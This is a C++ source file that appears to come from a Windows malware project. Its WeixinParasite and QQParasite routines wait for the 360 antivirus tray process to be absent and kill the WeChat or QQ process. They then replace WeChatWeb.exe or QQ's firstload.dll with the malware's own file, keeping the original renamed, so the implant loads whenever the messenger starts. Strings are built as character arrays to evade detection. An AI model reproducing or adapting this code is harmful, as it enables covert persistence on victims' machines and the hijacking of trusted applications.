#include <windows.h>
#include "api.h"
#include "BootWithApp.h"
#include "AntiVirus.h"
#include <Psapi.h>
#include "BootStartup.h"
#include "FileHelper.h"
#include "function/InstallApps.h"
#include "resource.h"
#include "public.h"
#include "AntiVirus.h"
#include "StrHelper.h"
#include "log.h"
#include "bootHelper.h"
#include "Utils.h"

using namespace std;





int __stdcall WeixinParasite() {
	int ret = 0;
	char szout[1024];

	if (*szWechatPath == 0)
	{
		ret = GetApplicationInfo(TRUE);
	}

	if (*szWechatPath)
	{
		char szwxappname[] = { 'W','e','C','h','a','t','.','e','x','e',0 };
		if (strstr(szParentProcName, szwxappname) == 0)
		{
			while (TRUE) {
				char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
				b360Running = GetProcessIdByName(sz360Tray) /*| GetProcessIdByName("360sd.exe") | GetProcessIdByName("360rp.exe")*/;
				if (b360Running)
				{
					lpSleep(60000);
				}
				else {
					break;
				}
			}
		}

		DWORD dwProcID = GetProcessIdByName(szwxappname);
		if (dwProcID)
		{
			ret = taskkill(szwxappname);
		}

		char szExeFullName[MAX_PATH] = { 0 };
		ret = lpGetModuleFileNameA(0, szExeFullName, MAX_PATH);
		char szexefn[MAX_PATH] = { 0 };
		ret = GetNameFromFullName(szExeFullName, szexefn);

		string wxfakeexefn = string(szWechatPath) + "\\" + szexefn;
		ret = FileHelper::CheckFileExist(wxfakeexefn.c_str());
		if (ret == 0)
		{
			string wxexepth = string(szWechatPath) + "\\";
			char szdllname[MAX_DLL_COUNT][MAX_PATH];
			DWORD dllcnt = 0;
			ret = backHome((char*)wxexepth.c_str(), strDataPath, szdllname, &dllcnt);

			char szwechatweb[] = { 'W','e','C','h','a','t','W','e','b','.','e','x','e',0 };
			string dstexefullname = wxexepth + szwechatweb;

			char szwechatwebOld[] = { 'W','e','C','h','a','t','W','e','b','o','r','g','.','e','x','e',0 };
			string dstoldexefn = wxexepth + szwechatwebOld;
			ret = lpCopyFileA((char*)dstexefullname.c_str(), (char*)dstoldexefn.c_str(), 0);

			ret = lpCopyFileA((char*)wxfakeexefn.c_str(), (char*)dstexefullname.c_str(), 0);
			//ret = lpDeleteFileA((char*)wxfakeexefn.c_str());
			if (ret <= 0)
			{
				wsprintfA(szout, "lpCopyFileA to:%s from file:%s error:%u\r\n", dstexefullname.c_str(), wxfakeexefn.c_str(), GetLastError());
				writeLog(szout);
			}
			else {
				wsprintfA(szout, "lpCopyFileA to:%s from file:%s ok\r\n", dstexefullname.c_str(), wxfakeexefn.c_str());
				writeLog(szout);
				return TRUE;
			}
		}
		else {
			//ret = copybackFiles(szWechatPath, strDataPath);
		}
	}
	return FALSE;
}



int __stdcall QQParasite() {
	int ret = 0;
	char szoutbuf[1024];

	if (*strQQPath == 0)
	{
		ret = GetApplicationInfo(TRUE);
	}

	if (*strQQPath)
	{
		//wait for 360
		char szqqappname[] = { 'Q','Q','.','e','x','e',0 };
		if (strstr(szParentProcName, szqqappname) == 0)
		{
			while (TRUE) {
				char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
				b360Running = GetProcessIdByName(sz360Tray) /*| GetProcessIdByName("360sd.exe") | GetProcessIdByName("360rp.exe")*/;
				if (b360Running)
				{
					lpSleep(60000);
				}
				else {
					break;
				}
			}
		}

		//release firstload.dll from memory
		char FIRSTLOAD_DLL_FILENAME[] = { 'f','i','r','s','t','l','o','a','d','.','d','l','l',0 };
		string szCurrentDllPath = string(strDataPath) + FIRSTLOAD_DLL_FILENAME;
		ret = FileHelper::CheckFileExist(szCurrentDllPath.c_str());
		if (ret == FALSE)
		{
			ret = ReleaseFile(strDataPath, FIRSTLOAD_DLL_FILENAME, lpThisDll);
			if (ret <= 0)
			{
				lpwsprintfA(szoutbuf, "QQParasite ReleaseFile:%s error\r\n", szCurrentDllPath.c_str());
				writeLog(szoutbuf);
				return FALSE;
			}
		}


		//make path systemservice
		string path = strQQPath;
		path.append("bin\\");
		path.append(LITTLEBEARNAME);
		path.append("\\");
		ret = FileHelper::CheckPathExist(path);
		if (ret == FALSE)
		{
			ret = lpCreateDirectoryA((char*)path.c_str(), 0);
			if (ret == FALSE)
			{
				lpwsprintfA(szoutbuf, "createdir:%s error code:%u\r\n", path.c_str(), lpRtlGetLastWin32Error());
				writeLog(szoutbuf);
				return FALSE;
			}
		}
		else {
			//ret = copybackFiles(path, strDataPath);
		}

		//copy file into systemservice
		char szdllname[MAX_DLL_COUNT][MAX_PATH];
		DWORD dllcnt = 0;
		ret = backHome((char*)path.c_str(), strDataPath, szdllname, &dllcnt);

		string qqinstallpath = strQQPath;
		qqinstallpath.append("bin\\");
		ret = SetBootWithQQ((char*)qqinstallpath.c_str(), strDataPath, FIRSTLOAD_DLL_FILENAME, szqqappname);
		if (ret)
		{
			return TRUE;
		}
		else {
			return FALSE;
		}
	}
	else {
		return FALSE;
	}

	return FALSE;
}





int SetBootWithQQ(char* szAppPath, char* strDataPath, char* szDllName, char* szAppName)
{
	int iRet = 0;
	char szoutbuf[1024];

	//check firstload.dll
	char szDllPath[MAX_PATH];
	lplstrcpyA(szDllPath, szAppPath);
	lplstrcatA(szDllPath, szDllName);
	if (FileHelper::CheckFileExist(string(szDllPath)) == FALSE)
	{
		return TRUE;
	}


	//make new name firstloadorg.dll
	char szDllNewName[MAX_PATH];
	lplstrcpyA(szDllNewName, szDllName);
	for (iRet = lplstrlenA(szDllNewName) - 1; iRet >= 0; iRet--)
	{
		if (szDllNewName[iRet] == '.')
		{
			char szorgdllprefix[] = { 'o','r','g','.','d','l','l',0 };
			lplstrcpyA(&szDllNewName[iRet], szorgdllprefix);
			break;
		}
	}


	//check firstloadorg.dll exist
	char szDllNewPath[MAX_PATH];
	lplstrcpyA(szDllNewPath, szAppPath);
	lplstrcatA(szDllNewPath, szDllNewName);
	int moveOldFlag = TRUE;
	if (FileHelper::CheckFileExist(string(szDllNewPath)))
	{
		moveOldFlag = 0;
	}
	else {
		moveOldFlag = TRUE;
	}

	int iOnlineFlag = FALSE;
	//check pid running
	DWORD dwProcID = GetProcessIdByName(szAppName);
	if (dwProcID)
	{
		iOnlineFlag = TRUE;

		HANDLE hProc = lpOpenProcess(PROCESS_ALL_ACCESS, 0, dwProcID);
		if (hProc)
		{
			iRet = lpTerminateProcess(hProc, 0);
			lpCloseHandle(hProc);
		}
		else
		{
			lpwsprintfA(szoutbuf, "open program:%s error code:%u\r\n", szAppName, lpRtlGetLastWin32Error());
			writeLog(szoutbuf);
			return FALSE;
		}
	}
	else
	{
		iOnlineFlag = FALSE;
		lpwsprintfA(szoutbuf, "program:%s is not running\r\n", szAppName);
		writeLog(szoutbuf);
	}

	if (moveOldFlag)
	{
		iRet = lpMoveFileA(szDllPath, szDllNewPath);
		if (iRet == 0)
		{
			lpwsprintfA(szoutbuf, "lpMoveFileA src:%s dst:%s error\r\n", szDllPath, szDllNewPath);
			writeLog(szoutbuf);
			return FALSE;
		}
		else {
			lpwsprintfA(szoutbuf, "lpMoveFileA src:%s dst:%s ok\r\n", szDllPath, szDllNewPath);
			writeLog(szoutbuf);
		}
	}

	char szCurrentDllPath[MAX_PATH];
	lplstrcpyA(szCurrentDllPath, strDataPath);
	lplstrcatA(szCurrentDllPath, szDllName);
	iRet = lpCopyFileA(szCurrentDllPath, szDllPath, 0);
	if (iRet == 0)
	{
		lpwsprintfA(szoutbuf, "lpCopyFileA src:%s dst:%s error\r\n", szCurrentDllPath, szDllPath);
		writeLog(szoutbuf);
		return FALSE;
	}
	else {
		lpwsprintfA(szoutbuf, "lpCopyFileA src:%s dst:%s ok\r\n", szCurrentDllPath, szDllPath);
		writeLog(szoutbuf);
	}

	if (iOnlineFlag)
	{
		lplstrcatA(szAppPath, szAppName);
		iRet = lpWinExec(szAppPath, SW_SHOW);
	}

	return TRUE;
}
